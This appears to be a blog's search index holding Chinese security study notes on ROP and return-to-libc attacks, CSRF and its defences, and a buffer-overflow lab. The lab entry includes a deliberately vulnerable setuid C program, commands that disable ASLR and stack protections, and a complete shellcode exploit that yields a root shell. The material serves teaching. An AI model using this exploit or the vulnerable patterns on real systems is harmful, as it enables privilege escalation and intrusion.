<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>代码重用攻击</title>
    <link href="/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/"/>
    <url>/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="代码重用攻击"><a href="#代码重用攻击" class="headerlink" title="代码重用攻击"></a>代码重用攻击</h1><h2 id="一、学习目标"><a href="#一、学习目标" class="headerlink" title="一、学习目标"></a>一、学习目标</h2><blockquote><p>理解代码重用攻击的原理</p><p>掌握代码重用攻击的攻击方式</p><p>设计代码重用攻击的防御方案</p></blockquote><h2 id="二、进程内存布局"><a href="#二、进程内存布局" class="headerlink" title="二、进程内存布局"></a>二、进程内存布局</h2><blockquote><p>栈：局部变量，函数参数，返回地址</p><p>堆：程序动态分配的内存</p><p>BSS段：未初始化的全局和静态变量</p><p>数据段：已初始化的全局变量和静态变量</p><p>代码段：程序代码</p></blockquote><h2 id="三、概念及原理"><a href="#三、概念及原理" class="headerlink" title="三、概念及原理"></a>三、概念及原理</h2><p><code>代码重用攻击</code>：栈缓存溢出后，将返回地址指向进程中已有代码，函数返回后，跳至攻击者指定已有代码继续执行，因重用了已存在代码，所以称为代码重用攻击</p><p><strong>return-to-libc</strong>：<strong>libc</strong>是几乎每个应用程序都包含的标准C语言库，包含了大量的基础函数实现，<strong>execve</strong>&#x2F;<strong>system</strong>函数可以帮助打开<strong>shell</strong>,进行后续攻击</p><p>例如：通过攻击打开<strong>shell</strong></p><p>（1）得到字符串：<strong>/bin/sh</strong></p><p>思路一：从程序将要加载的动态库中寻找，为后续攻击做准备，我们只需要知道“&#x2F;bin&#x2F;sh”字符串的地址即可</p><p>思路二：通过shell的特性，自己构造<strong>/bin/sh</strong>字符串，但是实际上你进行攻击的时候，很多情况下是没有办法用shell来构造一个环境变量的</p><p>（2）为<strong>execve</strong>准备参数</p><p>​32位x86架构linux系统中，参数传递通过<strong>栈</strong>来完成（下图中的<strong>rbp</strong>应该是<strong>ebp</strong>)，这里的话只需要自己构造栈就行，无需执行指令。</p><p><img src="/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/image-20230306084652318.png" alt="image-20230306084652318"></p><p>​64位x86架构linux系统中，参数传递通过<strong>栈+寄存器</strong>来完成，这里寄存器的值修改需要用到指令，可以用后面提到的<strong>ROP</strong>攻击</p><p><img src="/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/image-20230306084740219.png" alt="image-20230306084740219"></p><p>（3）跳转到<strong>execve</strong>：打开<strong>libc</strong>中<strong>execve</strong>函数的地址</p><p>​step 1：<strong>gdb</strong>中可以直接通过调试指令拿到</p><p><img src="/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/image-20230306100230622.png" alt="image-20230306100230622"></p><p>​step 2：利用栈缓存溢出将函数返回地址指向<strong>execve</strong>函数的地址</p><h2 id="四、ROP攻击"><a href="#四、ROP攻击" class="headerlink" title="四、ROP攻击"></a>四、<strong>ROP</strong>攻击</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">pop%eax<br>pop %ecx<br>mov%eax,(%ecx)<br>//修改任意内存<br></code></pre></td></tr></table></figure><p>​因为在攻击过程中你的栈可以由你自己进行构造，所以上述三条指令可以达到修改任意地址下的数据</p><p><img src="/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/image-20230306100558380.png" alt="image-20230306100558380"></p><p>可以利用的部分代码叫做<strong>Gadget</strong>，我们通过寻找合适的<strong>Gadget</strong>来构造一个<strong>Gadget Chain</strong>，然后并且构造合适的栈的内容来实现攻击。（上图中的<strong>rsp</strong>应该为<strong>esp</strong>）</p><p>所以分析程序中已有的可利用代码片段，利用<strong>ret</strong>指令将这些可利用代码片段串到一起，这种攻击方式称为<strong>ROP</strong>攻击</p><p><strong>Gadget自动提取工具：</strong><a href="https://github.com/JonathanSalwan/ROPgadget">JonathanSalwan&#x2F;ROPgadget: This tool lets you search your gadgets on your binaries to facilitate your ROP exploitation. ROPgadget supports ELF, PE and Mach-O format on x86, x64, ARM, ARM64, PowerPC, SPARC and MIPS architectures. (github.com)</a></p><h2 id="五、如何防御ROP攻击"><a href="#五、如何防御ROP攻击" class="headerlink" title="五、如何防御ROP攻击"></a>五、如何防御ROP攻击</h2><p>（1）从二进制文件中构造<strong>Gadget Chain</strong>进行防御</p><p>​1. 指令间填充</p><p><img src="/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/image-20230306101816158.png" alt="image-20230306101816158"></p><p>​如上图所示，单独看上面部分，只有<strong>movl</strong>指令和<strong>robl</strong>指令，没有<strong>ret</strong>指令，按理来说不具备成为<strong>Gadget</strong>的可能性，但是由于二进制指令是变长的，所以说从哪里开始我们无法确定，如果从<strong>04</strong>开始的话，<strong>04 d0 c3</strong>就构成了一个<strong>addb</strong>指令+<strong>ret</strong>指令，就成了一个<strong>Gadge</strong>t指令，所以说如果我们在指令之间填充<strong>nop</strong>指令的话，上面的代码片段就无法成为一个<strong>Gadget</strong>了，从而减少<strong>Gadget</strong>的数量。</p><p>​2. 减少可用代码规模</p><p>​       <strong>libc</strong>中大部分代码很少被使用，程序加载的时候将这部分很少使用的代码直接映射位不可执行，就可以降低构建<strong>Gadget Chain</strong>的概率</p><p>（2）针对栈缓存溢出的防御机制</p><p>​返回地址是因为栈缓存溢出而被修改的，所以说如果我们能够阻止栈缓存溢出，就可以阻止代码重用攻击。</p><p>（3）从执行Gadget Chain完成攻击进行防御</p><p>​控制流完整性（<strong>Control Flow Integrity</strong>）检测</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>跨站请求伪造(CSRF)</title>
    <link href="/2023/03/05/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89/"/>
    <url>/2023/03/05/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="跨站请求伪造（CSRF）"><a href="#跨站请求伪造（CSRF）" class="headerlink" title="跨站请求伪造（CSRF）"></a>跨站请求伪造（CSRF）</h1><h2 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h2><p>​当一个网页给它所在的网站发送<strong>HTTP</strong>请求的时候，该请求被称为同站请求；如果该请求被发送到一个不同的网站，则该请求为跨站请求。来自网站自己页面的请求显然是可信的，而来自其他网站页面的请求则不一定可信。网站通常依靠回话<strong>cookie</strong>来判断一个来自客户端的请求是否可信，但是浏览器为同站请求和跨站请求添加了一模一样的<strong>cookie</strong>，如此一来便无法区分一个请求是来自自己的页面还是第三方页面。可以这么理解<strong>CSRF</strong>：攻击者首先盗用了你的身份，然后以你的名义进行某些非法操作。CSRF能够使用你的账户发送邮件，获取你的敏感信息，甚至盗走你的账户购买商品等。<strong>CSRF</strong>攻击其实是利用了<strong>web</strong>中用户身份认证验证的一个漏洞：简单的身份验证仅仅能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p><p><img src="/2023/03/05/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89/image-20230305142140496.png" alt="image-20230305142140496"></p><h2 id="二、跨站请求伪造攻击"><a href="#二、跨站请求伪造攻击" class="headerlink" title="二、跨站请求伪造攻击"></a>二、跨站请求伪造攻击</h2><p><code>CSRF</code>攻击包括三部分：<code>目标用户</code>，<code>目标网站</code>，<code>由攻击者操纵的恶意网站</code></p><p>当用户访问恶意网站的时候，来自恶意网站的网页会发送伪造的HTTP请求给目标网站。</p><p>为了成功发动CSRF攻击，攻击者需要制作一个可以伪造跨站请求的网页，还需要引诱用户去访问该恶意网页。除此之外，用户还需要已经在目标网站登录，否则即使攻击者仍可以发送伪造请求，服务器也不会处理这些请求，而是会把用户引导到登录界面，并要求登录凭证，用户会立即察觉到问题，攻击就失效了。</p><p><img src="/2023/03/05/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89/image-20230305143043503.png" alt="image-20230305143043503"></p><h2 id="三、攻击原理以及过程"><a href="#三、攻击原理以及过程" class="headerlink" title="三、攻击原理以及过程"></a>三、攻击原理以及过程</h2><blockquote><p>（1）用户打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A</p><p>（2）用户通过信息验证后，网站A产生Cookie信息并返回浏览器，此时用户登录网站A成功，可以正常发送请求到网站A</p><p>（3）用户未退出网站A之前，在同一浏览器中，打开一个tab页访问恶意网站</p><p>（4）恶意网站接收到用户请求后，返回一些攻击性代码，并发出一个请求访问第三方站点A</p><p>（5）浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并且不知道该请求是由B发起的，所以会根据用户的Cookie信息以该用户的权限处理该请求。</p></blockquote><p>可见，达到CSRF攻击，必须达到两个条件：<code>登录受信任站点A，并在本地生成Cookie</code>,<code>在不登出A的情况，访问恶意站点B</code></p><h2 id="四、常见的CSRF攻击类型"><a href="#四、常见的CSRF攻击类型" class="headerlink" title="四、常见的CSRF攻击类型"></a>四、常见的CSRF攻击类型</h2><p>(1)<code>GET</code>类型的<code>CSRF</code></p><p>(2)<code>POST</code>类型的<code>CSRF</code></p><p>他们两者的一个区别是如何在请求中附加数据，GET请求把数据附加在请求的URL中，而POST请求把数据附加在请求的数据字段中。</p><h2 id="五、防御措施"><a href="#五、防御措施" class="headerlink" title="五、防御措施"></a>五、防御措施</h2><p>（1）使用<code>referer</code>头</p><p>​在<code>HTTP</code>请求头中的确有一个字段可以用来判断一个请求是否是跨站请求，就是<code>referer</code>头。他用来记录请求是从哪个网页发出的，它存储的是该网页的<code>URL</code>，使用<code>referer</code>字段服务器很容易判断一个请求是否来自它自己的网页。但是他会泄露使用者的浏览历史，产生隐私泄露问题，一些浏览器和代理会将此字段删除，以保护用户隐私，所以使用这个头字段作为防护策略可能会误把很多合法请求当做跨站请求。</p><p>（2）同站<code>cookie</code></p><p>​给<code>cookie</code>添加了一个特殊的属性，称为<code>SameSite</code>属性，该属性由服务器进行设置，它告诉浏览器一个<code>cookie</code>是否可以被跨站请求使用，没有此属性的<code>cookie</code>会被附加到所有的请求上，不管是同站请求还是跨站请求。拥有此属性的<code>cookie</code>会附加到同站请求上，是否会附加到跨站请求上取决于该属性的具体值，<code>SameSite</code>有两个属性值：<code>Strict</code>和<code>Lax</code>，如果值是<code>Strict</code>，那么<code>cookie</code>将不会与跨站请求一起发送；如果值是<code>Lax</code>，那么<code>cookie</code>只有在顶级导航的跨站请求时才一起发送</p><p>（3）秘密令牌</p><p>​网络应用判断一个请求是否是跨站，一个常用的方法就是秘密令牌，秘密令牌只有被自己的页面取得，其他网站的网页得不到，所有的同站请求都应当包含这个秘密令牌，这样就可以和跨站请求区分开，因为产生跨站请求的网页得不到秘密令牌。</p><p>​秘密令牌的两种典型实现方法</p><pre><code class="hljs">    1. 在每个网页内嵌入一个随机的机密值，当请求从该页面发起时，该机密值被放在请求中。由于同源策略，不同源的网页不能访问此页面的内容，因此这些恶意网页就不能在跨站请求中包含正确的机密值。    1. 把机密值放在`cookie`中，当一个请求发起后，请求从`cookie`中读出该机密值并将它包含在请求的数据字段中。该字段独立于已经被浏览器包含在`HTTP`头中的`cookie`，由于同源策略，不同源的页面不能读取其他源的`cookie`内容，因此攻击者无法在请求的数据字段包含该机密值。</code></pre><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>​在一个跨站请求伪造攻击中，目标用户被诱骗去访问攻击者的网页，同时还需要维护与目标网站的活跃会话，当用户访问攻击者的网页的时候，攻击者可以伪造一个请求，从恶意网页发送到目标网站。如果目标网站不能识别一个请求究竟是来自他的网页还是一个不可信任的第三方网页，那么就会产生问题，因为执行攻击者伪造的请求会产生安全威胁。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>代码漏洞分析与缓冲区溢出攻击</title>
    <link href="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"/>
    <url>/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="代码漏洞分析与缓冲区溢出攻击"><a href="#代码漏洞分析与缓冲区溢出攻击" class="headerlink" title="代码漏洞分析与缓冲区溢出攻击"></a>代码漏洞分析与缓冲区溢出攻击</h1><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><ol><li>了解代码漏洞扫描的基本原理； </li><li>熟悉缓冲区溢出攻击与防御的基本技术</li><li>熟悉如何发现常见软件漏洞(stack overflow, double free, format string vulnerability, etc)</li><li>按照实验步骤进行操作，攻击漏洞程序并获得 root 权限。</li></ol><h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><p><strong>64位Kali linux</strong>    <strong>vmware workstation 16 player</strong></p><h2 id="三、实验原理"><a href="#三、实验原理" class="headerlink" title="三、实验原理"></a>三、实验原理</h2><p>​缓冲区溢出是指程序试图向缓冲区写入超出预分配固定长度数据的情况。这一漏洞可以被恶意用户利用来改变程序的流控制，甚至执行代码的任意片段。这一漏洞的出现是由于数据缓冲器和返回地址的暂时关闭，溢出会引起返回地址被重写。</p><h2 id="四、实验步骤与结果分析"><a href="#四、实验步骤与结果分析" class="headerlink" title="四、实验步骤与结果分析"></a>四、实验步骤与结果分析</h2><p>该实验我个人使用的是 64 位 Kali linux，而本次实验为了方便观察汇编语句，我们需要在 32 位环境下作 操作，因此实验之前需要做一些准备。</p><p>（1）<strong>输入命令安装一些用于编译 32 位 C 程序的东西</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get update<br>sudo apt-get install -y lib32z1 libc6-dev-i386 lib32readline6-dev<br></code></pre></td></tr></table></figure><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150033257.png" alt="image-20230304150033257"></p><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150020838.png" alt="image-20230304150020838">（2)  <strong>初始设置</strong></p><p><strong>关闭地址空间随机化</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo sysctl -w kernel.randomize_va_space=0<br></code></pre></td></tr></table></figure><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150001996.png" alt="image-20230304150001996"></p><p>为了防范缓冲区溢出攻击及其它利用 shell 程序的攻击，许多 shell 程序在被调用时自动放弃它们的特权。因此，即使你能欺骗一个 Set-UID 程序调用一个 shell，也不能在这个 shell 中保持 root权限，所以我们需要使用一个没有此项保护的shell，例如：zsh，如下链接完毕</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">ln</span> -sf /bin/zsh /bin/sh<br></code></pre></td></tr></table></figure><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150135987.png" alt="image-20230304150135987"></p><p>（3）<strong>shellcode</strong></p><p>一般情况下，缓冲区溢出会造成程序崩溃，在程序中，溢出的数据覆盖了返回地址。而如果覆盖返回地址的数据是另一个地址，那么程序就会跳转到该地址，如果该地址存放的是一段精心设计的代码用于实现其他功能，这段代码就是 shellcode。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">char</span> *name[<span class="hljs-number">2</span>];<br>    name[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>    name[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">execve</span>(name[<span class="hljs-number">0</span>], name, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>此段代码对应的机器码如下：</p><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150741432.png" alt="image-20230304150741432"></p><p>（4）漏洞程序，保存为stack.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">bof</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span></span>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">12</span>];<br>    <span class="hljs-comment">/* The following statement has a buffer overflow problem */</span><br>    <span class="hljs-built_in">strcpy</span>(buffer, str);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span></span>&#123;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">517</span>];<br>    FILE *badfile;<br>    badfile = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;badfile&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-built_in">fread</span>(str, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>), <span class="hljs-number">517</span>, badfile);<br>    <span class="hljs-built_in">bof</span>(str);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Returned Properly\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过代码可以知道，程序会读取一个名为“badfile”的文件，并将文件内容装入“buffer”。 </p><p>（5）编译该程序，并设置 SET-UID。 </p><p>​GCC 编译器实现了一个名为 stackguard 的安全机制来防止缓冲区溢出。在存在这种保护的情况下， 缓冲区溢出攻击将不起作用。我们可以在编译期间使用-fno-stack-protector 选项禁用此保护。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -m32 -g -z execstack -fno-stack-protector -o stack stack.c<br>sudo <span class="hljs-built_in">chown</span> root stack<br>sudo <span class="hljs-built_in">chmod</span> 4755 stack<br></code></pre></td></tr></table></figure><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150602247.png" alt="image-20230304150602247"></p><p><strong>–fno-stack-protector</strong> 关闭<strong>canary</strong>保护机制</p><p><strong>-g</strong> 增加调试信息，保证后面我们可以对stack进行调试</p><p><strong>-z execstack</strong>   shellcode最终在栈里面执行，关闭<strong>栈不可执行</strong>的保护机制</p><p>（6）攻击程序： <strong>exploit.c</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* exploit.c */</span><br><span class="hljs-comment">/* A program that creates a file containing code for launching shell*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">char</span> shellcode[]=<br>    <span class="hljs-string">&quot;\x31\xc0&quot;</span>                  <span class="hljs-comment">//xorl %eax,%eax</span><br>    <span class="hljs-string">&quot;\x50&quot;</span>                      <span class="hljs-comment">//pushl %eax</span><br>    <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;//sh&quot;</span>                <span class="hljs-comment">//pushl $0x68732f2f</span><br>    <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;/bin&quot;</span>                <span class="hljs-comment">//pushl $0x6e69622f</span><br>    <span class="hljs-string">&quot;\x89\xe3&quot;</span>                  <span class="hljs-comment">//movl %esp,%ebx</span><br>    <span class="hljs-string">&quot;\x50&quot;</span>                      <span class="hljs-comment">//pushl %eax</span><br>    <span class="hljs-string">&quot;\x53&quot;</span>                      <span class="hljs-comment">//pushl %ebx</span><br>    <span class="hljs-string">&quot;\x89\xe1&quot;</span>                  <span class="hljs-comment">//movl %esp,%ecx</span><br>    <span class="hljs-string">&quot;\x99&quot;</span>                      <span class="hljs-comment">//cdq</span><br>    <span class="hljs-string">&quot;\xb0\x0b&quot;</span>                  <span class="hljs-comment">//movb $0x0b,%al</span><br>    <span class="hljs-string">&quot;\xcd\x80&quot;</span>                  <span class="hljs-comment">//int $0x80</span><br>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">517</span>];<br>    FILE *badfile;<br>    <span class="hljs-comment">/* Initialize buffer with 0x90 (NOP instruction) */</span><br>    <span class="hljs-built_in">memset</span>(&amp;buffer, <span class="hljs-number">0x90</span>, <span class="hljs-number">517</span>);<br>    <span class="hljs-comment">/* You need to fill the buffer with appropriate contents here */</span><br>    buffer[<span class="hljs-number">24</span>]=<span class="hljs-number">0xdd</span>;<br>    buffer[<span class="hljs-number">25</span>]=<span class="hljs-number">0xcf</span>;<br>    buffer[<span class="hljs-number">26</span>]=<span class="hljs-number">0xff</span>;<br>    buffer[<span class="hljs-number">27</span>]=<span class="hljs-number">0xff</span>;<br>    <span class="hljs-type">int</span> start=<span class="hljs-number">517</span>-<span class="hljs-built_in">strlen</span>(shellcode);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=start;i&lt;<span class="hljs-number">517</span>;i++)&#123;<br>        buffer[i]=shellcode[i-start];<br>    &#125;<br>    <span class="hljs-comment">/* Save the contents to the file &quot;badfile&quot; */</span><br>    badfile = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;./badfile&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>    <span class="hljs-built_in">fwrite</span>(buffer, <span class="hljs-number">517</span>, <span class="hljs-number">1</span>, badfile);<br>    <span class="hljs-built_in">fclose</span>(badfile);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>exploit.c</strong>文件用于生成<strong>badfile</strong>文件</p><p>我们需要填充的部分就是将<strong>shellcode</strong>放进去，然后将<strong>return address</strong>的值修改为<strong>shellcode</strong>的入口地址即可，下面我们进行调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb stack<br>b bof     //设置断点<br>r         //运行<br>next      //进入下一步<br>i r ebp   //查看ebp的值<br>i r esp   //查看esp的值<br>p &amp;buffer //查看数组buffer的起始地址<br></code></pre></td></tr></table></figure><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304151656195.png" alt="image-20230304151656195"></p><p>ebp的地址0xffffce08+4的地方就是return address，这里我讲shellcode放在了buffer[517]里面最后的24字节，那这样shellcode的入口地址就应该是[&amp;buffer+517-strlen(shellcode)]&#x3D;0xffffcdf4+493&#x3D;0xffffcfdd；</p><p>将入口地址0xffffcfdd填入到return address处，对应的buffer应该是buffer[24]、buffer[25]、buffer[26]、buffer[27]</p><p>小端法存储，所以</p><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304152058897.png" alt="image-20230304152058897"></p><p>编译<strong>exploit.c</strong>，并运行<strong>exploit</strong>，此时生成了<strong>badfile</strong>文件，运行<strong>stack</strong>即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -m32 -o exploit exploit.c<br>./exploit<br>./stack<br></code></pre></td></tr></table></figure><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304152309622.png" alt="image-20230304152309622"></p><p>最终发现得到<strong>root</strong>权限的<strong>shell</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Des算法的原理与实现</title>
    <link href="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    <url>/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
    
